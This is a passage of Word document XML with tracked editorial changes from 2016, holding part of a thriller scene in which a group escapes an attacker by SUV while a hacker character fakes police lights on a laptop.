        </w:rPr>
        <w:t xml:space="preserve"> the other side. He shoved and kicked at the door, making the barricade slide with every impact. The </w:t>
      </w:r>
      <w:ins w:id="1466" w:author="TextVet" w:date="2016-03-18T15:34:00Z">
        <w:r w:rsidR="0011484F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>pair</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1467" w:author="TextVet" w:date="2016-03-18T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0011484F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>two of them</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> kept the desk braced against the door with their own strength</w:t>
      </w:r>
      <w:ins w:id="1468" w:author="TextVet" w:date="2016-03-18T15:33:00Z">
        <w:r w:rsidR="00DB7470">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1469" w:author="TextVet" w:date="2016-03-18T15:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DB7470">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">, but </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1470" w:author="TextVet" w:date="2016-03-18T15:33:00Z">
        <w:r w:rsidR="00DB7470">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> yet, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>without their active defense</w:t>
      </w:r>
      <w:ins w:id="1471" w:author="TextVet" w:date="2016-03-18T15:33:00Z">
        <w:r w:rsidR="00DB7470">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it wouldn’t hold for long.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the geek shouted into his cellphone. “Car! Now!” Pushing against the desk, he turned to Tina. “I’ll hold this guy off. There’s friends coming with a car. Get Mike out of here. I’ll be right behind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looked out the glass front doors with the large frosted “W”. </w:t>
      </w:r>
      <w:ins w:id="1472" w:author="TextVet" w:date="2016-03-18T15:36:00Z">
        <w:r w:rsidR="003A0583">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1473" w:author="TextVet" w:date="2016-03-18T15:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A0583">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Outside, in the dark</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1474" w:author="TextVet" w:date="2016-03-18T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D05DF7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ness of the</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1475" w:author="TextVet" w:date="2016-03-18T15:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A0583">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> parking lot, </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1476" w:author="TextVet" w:date="2016-03-18T15:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00924453">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">there </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1477" w:author="TextVet" w:date="2016-03-18T15:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A0583">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>flashed t</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:del w:id="1478" w:author="TextVet" w:date="2016-03-18T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CE07B3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">distinct </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>red</w:t>
      </w:r>
      <w:ins w:id="1479" w:author="TextVet" w:date="2016-03-18T15:35:00Z">
        <w:r w:rsidR="006F067C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1480" w:author="TextVet" w:date="2016-03-18T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006F067C">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and</w:t>
      </w:r>
      <w:ins w:id="1481" w:author="TextVet" w:date="2016-03-18T15:35:00Z">
        <w:r w:rsidR="006F067C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1482" w:author="TextVet" w:date="2016-03-18T15:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006F067C">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blue strobe pattern of a police car</w:t>
      </w:r>
      <w:ins w:id="1483" w:author="TextVet" w:date="2016-03-18T15:36:00Z">
        <w:r w:rsidR="003A0583">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> beaconed</w:t>
        </w:r>
        <w:r w:rsidR="003A0583" w:rsidRPr="003A0583">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="003A0583" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>in the dark parking lot</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. A wave of relief washed over her. “Hey! Hey…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“My name’s Danny,” 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“Look!” she said. “The cops are here! It’s all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not the cops,” he replied. “That’s Moshen.”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black SUV screeched to a halt in front of the entrance. In the SUV’s headlights, she could see a young man standing in the parking lot. He looked small and scrawny with thick glasses, and carried an open laptop on his arm.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police </w:t>
      </w:r>
      <w:del w:id="1484" w:author="TextVet" w:date="2016-03-18T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A93228">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">car </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lights weren’t real</w:t>
      </w:r>
      <w:ins w:id="1485" w:author="TextVet" w:date="2016-03-18T15:39:00Z">
        <w:r w:rsidR="00466339">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1486" w:author="TextVet" w:date="2016-03-18T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00466339">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del w:id="1487" w:author="TextVet" w:date="2016-03-18T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00466339">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">They were </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">simply a video </w:t>
      </w:r>
      <w:del w:id="1488" w:author="TextVet" w:date="2016-03-18T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00466339">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">being </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>play</w:t>
      </w:r>
      <w:del w:id="1489" w:author="TextVet" w:date="2016-03-18T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00466339">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1490" w:author="TextVet" w:date="2016-03-18T15:39:00Z">
        <w:r w:rsidR="00466339">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on the scrawny kid’s laptop.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SUV </w:t>
      </w:r>
      <w:del w:id="1491" w:author="TextVet" w:date="2016-03-18T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A93228">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">let out a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>honk</w:t>
      </w:r>
      <w:ins w:id="1492" w:author="TextVet" w:date="2016-03-18T15:40:00Z">
        <w:r w:rsidR="00A93228">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</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grabbed her purse and hurried over to the scruffy guy. He was staring at the Russian and mumbling incoherently. She hustled him outside. The side door to the Navigator was open.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scrawny kid helped them into the middle row of seats. “Mike! Mike, you big idiot, are you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“Moshen!” the injured man said. His furry, bloody face lit up with childlike glee. “I need to tell you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is it, Mike?” Moshen said, his face sunken with worry.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slumped down into the far seat, resting his head against the window. “I rolled a natural twenty!”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answered, “What?”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grapple attack,” said Mike. “Against the fighter-thief with the leather armor. You saw,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came leaping into the SUV with his bulky gadget in hand. He slammed the car door shut behind him, clambered past Tina into the back seat, and yelled, “Drive!”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Through the windshield, the SUV’s headlights illuminated a man rounding the corner of the building, carrying a handgun with a silencer. Jason hit the gas and cranked the wheel as the man raised his firearm. The SUV lurched heavily and pulled away in a </w:t>
      </w:r>
      <w:ins w:id="1493" w:author="TextVet" w:date="2016-03-18T15:42:00Z">
        <w:r w:rsidR="003D013E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>hairpin</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1494" w:author="TextVet" w:date="2016-03-18T15:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D013E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sharp</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> turn. A series of pops rang out across the parking lot.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middle passenger-side window shattered, </w:t>
      </w:r>
      <w:ins w:id="1495" w:author="TextVet" w:date="2016-03-18T15:45:00Z">
        <w:r w:rsidR="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>shower</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1496" w:author="TextVet" w:date="2016-03-18T15:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1497" w:author="TextVet" w:date="2016-03-18T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>prinkl</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing glass</w:t>
      </w:r>
      <w:del w:id="1498" w:author="TextVet" w:date="2016-03-18T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1499" w:author="TextVet" w:date="2016-03-18T15:44:00Z">
        <w:r w:rsidR="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1500" w:author="TextVet" w:date="2016-03-18T15:45:00Z">
        <w:r w:rsidR="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">shards </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:ins w:id="1501" w:author="TextVet" w:date="2016-03-18T15:44:00Z">
        <w:r w:rsidR="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>side</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1502" w:author="TextVet" w:date="2016-03-18T15:44:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="009828D9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>to the interior of the car</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Mike’s head bounced between the window and the headrest as Jason dodged and weaved. “Owwwwwwwww,” Mike droned.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gunfire stopped, but was replaced by the sound of car doors opening and slamming shut. The tires of the Tesla Roadster squealed against the pavement.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Navigator had barely </w:t>
      </w:r>
      <w:ins w:id="1503" w:author="TextVet" w:date="2016-03-18T15:47:00Z">
        <w:r w:rsidR="00C17301">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>traveled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1504" w:author="TextVet" w:date="2016-03-18T15:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C17301">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>made it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a block </w:t>
      </w:r>
      <w:del w:id="1505" w:author="TextVet" w:date="2016-03-18T15:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C17301">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">down the street </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">before the Roadster caught up, </w:t>
      </w:r>
      <w:ins w:id="1506" w:author="TextVet" w:date="2016-03-18T15:46:00Z">
        <w:r w:rsidR="00123EC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>draw</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1507" w:author="TextVet" w:date="2016-03-18T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00123EC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>pull</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:del w:id="1508" w:author="TextVet" w:date="2016-03-18T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00123EC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> up</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1509" w:author="TextVet" w:date="2016-03-18T15:46:00Z">
        <w:r w:rsidR="00123EC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>level</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1510" w:author="TextVet" w:date="2016-03-18T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00123EC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>next</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1511" w:author="TextVet" w:date="2016-03-18T15:46:00Z">
        <w:r w:rsidR="00123EC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>with</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1512" w:author="TextVet" w:date="2016-03-18T15:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00123EC3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> them on the driver’s side. The hum of the Roadster’s electric motor rose and dropped in pitch as its driver kept pace. Jason’s SUV was no match for the all-electric sports car’s speed and maneuverability.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saw the long silenced handgun pointing at him out of the passenger side of the Roadster.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Everybody in the car flew forward in their seats as Jason slammed on the brake. The throbbing of the SUV’s anti-lock system pulsed through the cabin as the Navigator came to a screeching halt. Jason fought with the wheel to keep the car from pitching into a roll.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Roadster slowed down and pulled into a tight U-turn.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E06AD" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="1513" w:author="TextVet" w:date="2016-03-18T15:49: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SUV’s passengers were thrown about as Jason rapidly reared the car up, maneuvering halfway through a three-point turn, pausing </w:t>
      </w:r>
      <w:del w:id="1514" w:author="TextVet" w:date="2016-03-18T15:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CB56FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">briefly </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1515" w:author="TextVet" w:date="2016-03-18T15:49:00Z">
